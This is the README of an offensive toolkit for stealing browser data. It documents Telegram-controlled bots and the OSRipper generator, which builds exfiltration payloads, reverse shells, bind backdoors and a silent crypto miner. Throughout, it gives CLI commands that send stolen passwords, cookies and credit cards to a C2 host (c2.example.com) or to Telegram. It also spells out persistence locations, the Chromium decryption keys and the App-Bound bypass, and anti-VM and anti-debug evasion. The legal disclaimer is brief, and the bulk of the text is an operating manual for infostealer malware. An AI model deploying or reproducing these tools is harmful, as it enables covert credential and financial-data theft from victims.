# HackBrowserData

**Cross-platform browser data extraction framework for offensive security operations.**

Extracts saved passwords, cookies, history, bookmarks, credit cards, downloads, and Wi-Fi credentials from all major browsers on Windows, Linux, WSL2, and Android. Includes Telegram-based C2 bots, an advanced payload generator (OSRipper), and a web-based command-and-control server.

\---

## Table of Contents

* [Features](#features)
* [Supported Platforms](#supported-platforms)
* [Supported Browsers](#supported-browsers)
* [Architecture](#architecture)
* [Quick Start](#quick-start)

  * [Telegram Bots](#telegram-bots)
  * [OSRipper Payloads](#osripper-payloads)
  * [PhantomNet Client](#phantomnet-client)
* [Telegram Bot Commands](#telegram-bot-commands)
* [Extraction Capabilities](#extraction-capabilities)
* [Encryption Handling](#encryption-handling)
* [Persistence Mechanisms](#persistence-mechanisms)
* [OSRipper — Payload Generator \& C2](#osripper--payload-generator--c2)

  * [Installation](#installation)
  * [Interactive Menu](#interactive-menu)
  * [CLI Usage](#cli-usage)
  * [Browser Exfiltration Payloads](#browser-exfiltration-payloads)
  * [C2 Server](#c2-server)
  * [Obfuscation \& Compilation](#obfuscation--compilation)
* [PhantomNet Client](#phantomnet-client-1)
* [Cookie Monster (Cobalt Strike BOF)](#cookie-monster-cobalt-strike-bof)
* [Project Structure](#project-structure)
* [Dependencies](#dependencies)
* [Configuration](#configuration)
* [Legal Disclaimer](#legal-disclaimer)
* [License](#license)

\---

## Features

* **Full browser data extraction** — passwords, cookies, history, bookmarks, credit cards, downloads
* **Wi-Fi password recovery** (Windows)
* **Desktop screenshots** (Windows)
* **Directory harvesting** (PhantomNet)
* **Four platform-specific bots** — Windows, Windows Native, Linux/WSL2, Android
* **Three exfiltration modes** — Telegram, OSRipper C2, or both simultaneously
* **v10/v11 AES-256-GCM decryption** via DPAPI (Windows) and PBKDF2 (Linux)
* **v20 App-Bound Encryption** decryption via double-DPAPI and elevation service COM
* **Locked file bypass** — Win32 shared-read copy, `esentutl.exe` VSS shadow copy, PowerShell copy (WSL)
* **Automatic browser kill** before extraction to release file locks and flush WAL
* **SQLite WAL checkpoint** after database copy for complete data recovery
* **Payload generation** — bind, reverse TCP, DoH C2, HTTPS C2, miner, browser exfil, custom crypter
* **Multi-layer obfuscation** — zlib/base64/base32 encoding, anti-debug, anti-VM, sandbox detection
* **Binary compilation** via Nuitka (produces standalone executables)
* **Web-based C2 dashboard** with session management, command queuing, and exfil data browser
* **Automatic persistence** — Registry, Startup folder, Task Scheduler, systemd, cron, XDG autostart, Android boot
* **Auto-dependency installation** — bots bootstrap `requests` and `pycryptodome` on first run

\---

## Supported Platforms

|Platform|Bot|OSRipper Payload|Persistence|
|-|-|-|-|
|Windows 10/11 (x86/x64)|`bot\_windows.py`, `bot\_windows\_native.py`|`exfil\_windows`|Registry Run, Startup folder, Task Scheduler|
|Linux (Ubuntu, Debian, Fedora, Arch)|`bot\_linux.py`|`exfil\_linux`|systemd user service, cron `@reboot`, XDG autostart|
|WSL2|`bot\_linux.py` (auto-detects WSL)|`exfil\_wsl`|systemd, cron, `\~/.bashrc` injection|
|Android (Termux, QPython3, Pydroid 3)|`bot\_android.py`|`exfil\_android`|Termux boot script, cron|

\---

## Supported Browsers

### Chromium-based

Chrome, Chrome Beta, Chrome Dev, Chromium, Microsoft Edge, Edge Beta, Brave, Opera, Opera GX, Vivaldi, Yandex Browser, CocCoc, CentBrowser, Torch, Iridium, Kiwi (Android), Samsung Internet (Android)

### Firefox-based

Firefox, Firefox ESR, LibreWolf, Waterfox, Thunderbird

### Additional paths (Linux)

Snap (`/snap/chromium`), Flatpak (`\~/.var/app/`), and standard `\~/.config/` locations

### WSL2 cross-extraction

Reads Windows browser profiles from `/mnt/c/Users/\*/AppData/` while running inside WSL, using DPAPI-via-PowerShell for decryption

\---

## Architecture

```
┌──────────────────────────────────────────────────────────────┐
│                      Operator Machine                        │
│                                                              │
│  ┌──────────────┐   ┌──────────────┐   ┌────────────────┐   │
│  │  Telegram     │   │  OSRipper    │   │  OSRipper C2   │   │
│  │  (commands)   │   │  Generator   │   │  Server (Flask) │   │
│  └──────┬───────┘   └──────┬───────┘   └───────┬────────┘   │
│         │                  │                    │             │
└─────────┼──────────────────┼────────────────────┼────────────┘
          │                  │                    │
          ▼                  ▼                    ▼
┌─────────────────┐  ┌──────────────┐  ┌──────────────────────┐
│  Telegram Bots  │  │ Exfil        │  │  C2 Agents           │
│  (standalone)   │  │ Payloads     │  │  (DoH / HTTPS)       │
│                 │  │ (generated)  │  │                       │
│  bot\_windows.py │  │ exfil\_win.py │  │  agent.py             │
│  bot\_linux.py   │  │ exfil\_lin.py │  │  ├─ doh\_client.py     │
│  bot\_android.py │  │ exfil\_wsl.py │  │  ├─ https\_client.py   │
│  phantomnet.py  │  │ exfil\_and.py │  │  ├─ executor.py       │
│                 │  │              │  │  ├─ session.py         │
│                 │  │              │  │  └─ stealth.py         │
└────────┬────────┘  └──────┬───────┘  └──────────┬───────────┘
         │                  │                     │
         ▼                  ▼                     ▼
   ┌─────────┐        ┌─────────┐          ┌─────────┐
   │Telegram │        │Telegram │          │OSRipper │
   │  API    │        │+ C2 API │          │ C2 API  │
   └─────────┘        └─────────┘          └─────────┘
```

\---

## Quick Start

### Telegram Bots

1. Create a Telegram bot via [@BotFather](https://t.me/BotFather) and get your bot token
2. Get your chat ID from [@userinfobot](https://t.me/userinfobot)
3. Edit the bot file for your target platform:

```python
BOT\_TOKEN = "YOUR\_BOT\_TOKEN"
CHAT\_ID   = "YOUR\_CHAT\_ID"
```

4. Deploy and run:

```bash
# Windows
python bot\_windows\_native.py

# Linux / WSL2
python3 bot\_linux.py

# Android (Termux)
python3 bot\_android.py
```

5. Send `/extract` to your bot on Telegram to receive a ZIP with all browser data.

### OSRipper Payloads

```bash
cd OSRipper
pip install -e .

# Interactive menu
osripper

# CLI — generate a Windows exfil payload with Telegram delivery
osripper-cli exfil --platform windows --bot-token "TOKEN" --chat-id "ID" --c2-mode telegram

# CLI — generate a dual-mode payload (Telegram + C2)
osripper-cli exfil --platform linux --bot-token "TOKEN" --chat-id "ID" \\
    --c2-url "https://c2.example.com" --c2-mode dual

# Start the C2 server
osripper-cli server --domain c2.example.com --port 8443
```

### PhantomNet Client

Cross-platform agent that uses the Go shared library (`hackbrowserdata.so`) when available, with Python fallback:

```bash
python3 phantomnet-client.py
```

\---

## Telegram Bot Commands

|Command|Description|Availability|
|-|-|-|
|`/extract`|Collect all browser data and send as ZIP|All bots|
|`/info`|System information (OS, hostname, username, Python version)|All bots|
|`/browsers`|List all detected browsers and profile paths|All bots|
|`/status`|Bot uptime, last extraction time, persistence status|All bots|
|`/help`|List available commands|All bots|
|`/start`|Welcome message|All bots|
|`/wifi`|Extract saved Wi-Fi passwords|Windows Native only|
|`/screenshot`|Capture desktop screenshot|Windows Native, PhantomNet|
|`/harvest <path>`|Archive a directory tree into a ZIP|PhantomNet only|

\---

## Extraction Capabilities

### Data Types

|Data Type|Chromium|Firefox|Source File|
|-|-|-|-|
|Passwords|`Login Data` (SQLite)|`logins.json` + `key4.db`|AES-GCM / DES3-CBC|
|Cookies|`Cookies` / `Network/Cookies`|`cookies.sqlite`|AES-GCM / plaintext|
|History|`History` (SQLite)|`places.sqlite`|Plaintext|
|Bookmarks|`Bookmarks` (JSON)|`places.sqlite`|Plaintext|
|Credit Cards|`Web Data` (SQLite)|—|AES-GCM|
|Downloads|`History` (SQLite)|—|Plaintext|
|Wi-Fi Passwords|`netsh wlan` (Windows)|—|Plaintext XML|

### Output Format

Extraction produces a timestamped ZIP containing:

* `system\_info.txt` — hostname, OS, username, architecture
* `full\_data.json` — complete structured extraction data
* `{browser}\_{profile}\_passwords.txt` — readable password list
* `{browser}\_{profile}\_cookies.txt` — cookie dump
* `{browser}\_{profile}\_history.txt` — browsing history
* `{browser}\_{profile}\_bookmarks.txt` — bookmark list
* `{browser}\_{profile}\_credit\_cards.txt` — card data
* `{browser}\_{profile}\_downloads.txt` — download history
* `wifi\_passwords.txt` — Wi-Fi SSIDs and keys (Windows)

\---

## Encryption Handling

### Chromium (Windows)

|Version Prefix|Encryption|Decryption Method|
|-|-|-|
|(no prefix)|DPAPI (Chrome < 80)|`CryptUnprotectData` via ctypes|
|`v10` / `v11`|AES-256-GCM|DPAPI-decrypt master key from `Local State`, then AES-GCM|
|`v20`|App-Bound (Chrome 127+)|Stage 1: User DPAPI → Stage 2: Double DPAPI → Stage 3: Elevation service COM|

### Chromium (Linux)

AES-128-CBC with PBKDF2-derived key. Password is `peanuts` (Chromium default) or from GNOME Keyring / kwallet. Salt: `saltysalt`, 1 iteration for Chromium, 1003 for custom.

### Chromium (WSL2)

Windows browser data at `/mnt/c/` is decrypted via `powershell.exe -Command "\[Security.Cryptography.ProtectedData]::Unprotect(...)"` for DPAPI operations.

### Firefox

Master key extracted from `key4.db` (NSS/PKCS#11 format). Password entries in `logins.json` are DER-encoded and decrypted with 3DES-CBC or AES-256-CBC using the derived key.

\---

## Persistence Mechanisms

### Windows

1. **Registry Run key** — `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`
2. **Startup folder** — `%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\`
3. **Task Scheduler** — `schtasks /create` with `ONLOGON` trigger
4. **Console hiding** — Auto-relaunches via `pythonw.exe` (no visible window)

### Linux

1. **systemd user service** — `\~/.config/systemd/user/browser-update.service`
2. **Cron** — `@reboot` entry via `crontab`
3. **XDG autostart** — `\~/.config/autostart/browser-update.desktop`
4. **WSL-specific** — `\~/.bashrc` background launch injection

### Android

1. **Termux boot** — `\~/.termux/boot/start-bot.sh`
2. **Cron** — `@reboot` (if crond is available)

\---

## OSRipper — Payload Generator \& C2

### Installation

```bash
cd OSRipper
pip install -e .

# Optional: install Nuitka for binary compilation
osripper-cli setup
```

**Requirements:** Python >= 3.6

### Interactive Menu

```
$ osripper

 ▒█████    ██████  ██▀███   ██▓ ██▓███   ██▓███  ▓█████  ██▀███
▒██▒  ██▒▒██    ▒ ▓██ ▒ ██▒▓██▒▓██░  ██▒▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒
...

\[1] Create Bind Backdoor
\[2] Create Encrypted TCP Meterpreter
\[3] Crypt Custom Code
\[4] Create Silent BTC Miner
\[5] Create Encrypted Meterpreter (Staged)
\[6] Create DNS-over-HTTPS C2 Payload
\[7] Create Browser Exfiltration Payload
```

### CLI Usage

```bash
# Bind backdoor
osripper-cli bind --port 4444 --obfuscate --compile

# Reverse SSL TCP meterpreter
osripper-cli reverse --host 10.0.0.1 --port 4444 --obfuscate --enhanced

# DNS-over-HTTPS C2 payload
osripper-cli doh --domain c2.example.com --obfuscate --enhanced --compile

# Custom script encryption
osripper-cli custom --script my\_payload.py --obfuscate

# Start C2 server
osripper-cli server --domain c2.example.com --port 8443 --https

# Setup optional dependencies
osripper-cli setup
```

### Browser Exfiltration Payloads

Generate platform-specific browser extraction payloads with configurable exfiltration channel:

```bash
# Windows payload — Telegram only
osripper-cli exfil --platform windows \\
    --bot-token "123:ABC" --chat-id "456" \\
    --c2-mode telegram

# Linux payload — C2 server only
osripper-cli exfil --platform linux \\
    --c2-url "https://c2.example.com:8443" \\
    --c2-mode c2

# WSL2 payload — dual mode (Telegram + C2)
osripper-cli exfil --platform wsl2 \\
    --bot-token "123:ABC" --chat-id "456" \\
    --c2-url "https://c2.example.com:8443" \\
    --c2-mode dual

# Android payload — rooted device
osripper-cli exfil --platform android \\
    --bot-token "123:ABC" --chat-id "456" \\
    --c2-mode telegram --root
```

**Exfiltration modes:**

|Mode|Telegram|C2 Server|Use Case|
|-|-|-|-|
|`telegram`|Yes|No|Simple, reliable, no infrastructure needed|
|`c2`|No|Yes|Full operational control, no third-party dependency|
|`dual`|Yes|Yes|Redundancy — data goes to both channels|

**Exfil CLI flags:**

|Flag|Description|
|-|-|
|`--platform`|`windows`, `linux`, `wsl2`, `android`|
|`--bot-token`|Telegram bot API token|
|`--chat-id`|Telegram chat ID for receiving data|
|`--c2-url`|OSRipper C2 server URL|
|`--c2-mode`|`telegram`, `c2`, or `dual`|
|`--interval`|Auto-extraction interval in seconds (default: 3600)|
|`--no-persist`|Disable automatic persistence|
|`--root`|Enable root mode (Android only)|

### C2 Server

Flask-based HTTPS/DoH command-and-control server with web dashboard.

```bash
# Start C2 server
osripper-cli server --domain c2.example.com --port 8443 --https

# Access web UI at https://localhost:8443
```

**C2 Features:**

* DNS-over-HTTPS (DoH) tunneling for covert communication
* HTTPS beaconing with certificate pinning
* Web UI for session management and command queuing
* Exfiltration data upload endpoints (`/api/exfil/upload`, `/api/exfil/beacon`)
* Session database with command history
* Self-signed certificate generation

**C2 API Endpoints:**

|Endpoint|Method|Purpose|
|-|-|-|
|`/api/exfil/upload`|POST|Receive extracted browser data (ZIP)|
|`/api/exfil/beacon`|POST|Receive status beacons from payloads|
|`/api/exfil/list`|GET|List all received exfil data|
|`/api/exfil/download/<file>`|GET|Download specific exfil archive|
|`/api/sessions`|GET|List active agent sessions|
|`/api/session/<id>/command`|POST|Queue command for agent|

### Obfuscation \& Compilation

**Basic obfuscation** — Multi-layer zlib + base64/base32 encoding:

```bash
osripper-cli reverse --host 10.0.0.1 --port 4444 --obfuscate
```

**Enhanced obfuscation** — Adds anti-debug, anti-VM, sandbox detection:

```bash
osripper-cli reverse --host 10.0.0.1 --port 4444 --obfuscate --enhanced
```

**Binary compilation** — Standalone executable via Nuitka:

```bash
osripper-cli reverse --host 10.0.0.1 --port 4444 --obfuscate --compile
```

**Evasion features:**

* VM detection (VMware, VirtualBox, Hyper-V, QEMU, Xen)
* Debugger detection (ptrace, `IsDebuggerPresent`)
* Sandbox detection (analysis tool processes, suspicious usernames)
* Sleep-based timing checks
* Process name enumeration
* Junk code injection

\---

## PhantomNet Client

Cross-platform Telegram agent that leverages the Go shared library (`hackbrowserdata.so` / `.dll` / `.dylib`) for native-speed extraction, with a pure-Python fallback when the library is unavailable.

**Additional capabilities over standard bots:**

* `/harvest <path>` — Archive any directory tree to ZIP
* `/screenshot` — Desktop capture (cross-platform)
* Go library integration for faster extraction
* Auto-detects Windows, Linux, macOS, and Android

```bash
# Place Go shared library next to script (optional)
cp hackbrowserdata.so ./
python3 phantomnet-client.py
```

\---

## Cookie Monster (Cobalt Strike BOF)

Beacon Object File for in-memory cookie decryption during Cobalt Strike operations. Located in `cookie-monster/`.

\---

## Project Structure

```
HackBrowserData/
├── bots/
│   ├── bot\_windows.py           # Windows bot (WSL-compatible)
│   ├── bot\_windows\_native.py    # Windows-only bot (Wi-Fi, screenshots)
│   ├── bot\_linux.py             # Linux + WSL2 bot
│   └── bot\_android.py           # Android bot (root/non-root)
├── OSRipper/
│   ├── src/osripper/
│   │   ├── main.py              # Interactive menu
│   │   ├── cli.py               # CLI argument parsing
│   │   ├── generator.py         # Payload generation engine
│   │   ├── config.py            # Default configuration
│   │   ├── obfuscator\_enhanced.py  # Multi-layer obfuscation
│   │   ├── agent/
│   │   │   ├── agent.py         # C2 agent main loop
│   │   │   ├── doh\_client.py    # DNS-over-HTTPS client
│   │   │   ├── https\_client.py  # HTTPS beacon client
│   │   │   ├── executor.py      # Command execution engine
│   │   │   ├── session.py       # Session management
│   │   │   └── stealth.py       # Evasion techniques
│   │   ├── c2/
│   │   │   ├── server.py        # Flask C2 server
│   │   │   ├── cert\_utils.py    # SSL certificate generation
│   │   │   └── templates/       # Web UI templates
│   │   └── payloads/
│   │       ├── exfil\_windows.py # Windows extraction template
│   │       ├── exfil\_linux.py   # Linux extraction template
│   │       ├── exfil\_wsl.py     # WSL2 extraction template
│   │       └── exfil\_android.py # Android extraction template
│   ├── GUI/                     # Web-based GUI
│   ├── pyproject.toml
│   └── requirements.txt
├── phantomnet-client.py         # Cross-platform Go-bridge agent
├── cookie-monster/              # Cobalt Strike BOF
├── steal-all-files/             # File exfil utilities
├── browser/                     # Go browser detection
├── browserdata/                 # Go data extractors
├── crypto/                      # Go crypto primitives
├── cmd/hack-browser-data/       # Go CLI entry point
├── hackbrowserdata.so           # Go shared library
├── requirements.txt             # Python dependencies
└── go.mod                       # Go module definition
```

\---

## Dependencies

### Python Bots (auto-installed)

|Package|Purpose|
|-|-|
|`requests`|HTTP client for Telegram API / C2 communication|
|`pycryptodome`|AES-GCM, DES3-CBC, PBKDF2 decryption|

### OSRipper

|Package|Purpose|
|-|-|
|`requests`|HTTP client|
|`flask`|C2 web server|
|`dnspython`|DoH DNS resolution|
|`cryptography`|TLS certificate generation|
|`rich`|Terminal UI / colored output|
|`colorama`|Windows terminal colors|
|`click`|CLI framework|
|`pyyaml`|Configuration files|
|`psutil`|Process management / evasion|
|`Nuitka`|Binary compilation (optional)|
|`pyngrok`|Ngrok tunneling (optional)|

### Go Module

The Go codebase provides the `hackbrowserdata.so` shared library and the standalone `hack-browser-data` CLI binary. Build with:

```bash
go build -o hack-browser-data ./cmd/hack-browser-data/
```

\---

## Configuration

### Bot Configuration

Each bot has a configuration block at the top of the file:

```python
BOT\_TOKEN      = "YOUR\_BOT\_TOKEN"      # Telegram Bot API token
CHAT\_ID        = "YOUR\_CHAT\_ID"        # Authorized Telegram chat ID
CHECK\_INTERVAL = 3600                   # Auto-extraction interval (0 = disabled)
AUTO\_PERSIST   = True                   # Install persistence on first run
```

### OSRipper Configuration (`config.py`)

```yaml
general:
  output\_dir: dist
  log\_level: INFO
  auto\_cleanup: true

payload:
  auto\_obfuscate: true
  obfuscation\_layers: 5
  anti\_debug: true
  anti\_vm: true

network:
  use\_ssl: true
  timeout: 30
  retries: 3

evasion:
  sandbox\_detection: true
  vm\_detection: true
  debugger\_detection: true
```

\---

## Legal Disclaimer

This software is provided for **authorized security testing and research purposes only**. Usage of this tool against systems without explicit written permission from the system owner is illegal and unethical.

The authors assume no liability for misuse of this software. Users are solely responsible for ensuring compliance with applicable laws and regulations in their jurisdiction.

**Required for lawful use:**

* Written authorization from the target organization
* Defined scope and rules of engagement
* Compliance with all applicable laws

\---

## License

[MIT License](LICENSE) — Copyright (c) 2020 moonD4rk

